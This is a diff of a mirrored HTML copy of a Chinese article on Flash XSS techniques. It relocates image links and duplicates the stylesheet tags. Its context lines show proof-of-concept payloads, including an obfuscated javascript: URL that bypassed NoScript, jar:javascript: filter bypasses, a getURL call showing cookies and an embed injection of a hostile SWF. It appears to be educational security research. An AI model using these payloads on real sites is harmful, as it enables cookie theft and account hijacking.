@@ -3,7 +3,7 @@
 			<head>
 			     <title>一些你可能不知道的Flash XSS技巧 - mramydnei</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/papers/948">http://drops.wooyun.org/papers/948</a></h1>
 				
@@ -67,7 +67,7 @@
 http://0me.me/demo/xss/xssproject.swf?%I%R%S%D%%Ljs=loca%Xtion.hr%Yef='jav%Zascri %AXpt:x="&lt;sc%AYript&gt;ale%AZrt(docu%?ment.dom%/ain)&lt;/sc%&amp;ript&gt;"'
 </code></pre>
 
-<p><img src="http://static.wooyun.org/201402/2014021816521453755.png" alt="2014021816521453755.png"></p>
+<p><img src="../images_result/images/2014021816521453755.png" alt="2014021816521453755.png"></p>
 
 <p>成功了！我使用这个trick也绕过了noscript，不过这个漏洞已经在 2.6.6.8修复了。</p>
 
@@ -89,7 +89,7 @@ if(!dangerousInput.test(input))
 
 <p>我们就可以使用先前提到的方法来绕过这个检测：</p>
 
-<p><img src="http://static.wooyun.org/201402/2014021816525218614.png" alt="2014021816525218614.png"></p>
+<p><img src="../images_result/images/2014021816525218614.png" alt="2014021816525218614.png"></p>
 
 <pre><code>http://0me.me/demo/xss/flash/link_protocol_test.swf?input=jar:javascript:alert(1);//
 </code></pre>
@@ -227,7 +227,7 @@ getURL("jar:javascript:alert('domain: '+document.domain+'\\r\\nCookies: '+docume
 <pre><code>http://www.sdl.me/xssdemo/xss.asp?input=&lt;embed src=http://0me.me/demo/xss/flash/embededXSS.swf&gt;
 </code></pre>
 
-<p><img src="http://static.wooyun.org/201402/2014021816544865336.png" alt="2014021816544865336.png"></p>
+<p><img src="../images_result/images/2014021816544865336.png" alt="2014021816544865336.png"></p>
 
 <p>但是我们也可以使用name来让它变得可以在其它浏览器中执行。</p>
 
